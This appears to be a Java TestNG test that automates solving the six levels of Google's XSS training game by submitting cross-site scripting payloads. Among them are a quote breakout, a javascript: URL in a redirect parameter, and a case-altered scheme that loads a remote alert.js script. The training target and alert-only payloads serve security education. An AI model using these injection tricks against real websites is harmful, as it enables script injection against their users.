package xss;

import org.testng.annotations.Test;

import static xss.Page.MainPage.enterToMainPage;

public class XSSTest extends BaseTest {

    @Test()
    public void xssGame() {
        enterToMainPage()
            .goToFirstLevel()
            .inputScriptForFirstPage(getCheatSheetAlert())
            .acceptAlert()
            .goToSecondLevel()
            .inputScriptForSecondPage(getCheatSheetAlert())
            .acceptAlert()
            .goToThirdLevel()
            .inputScriptForThirdPage(getCheatSheetAlert())
            .acceptAlert()
            .goToFourthLevel()
            .inputScriptForFourthPage("');alert('xss")
            .acceptAlert()
            .goToFifthLevel()
            .inputScriptForFifthPage("/signup?next=javascript:alert(\"xss\");")
            .acceptAlert()
            .goToSixthLevel()
            .inputScriptForSixthPage("https://xss-game.appspot.com/level6/frame#htTps://amlet86.github.io/alert.js")
            .acceptAlert()
            .goToDone();

    }

}
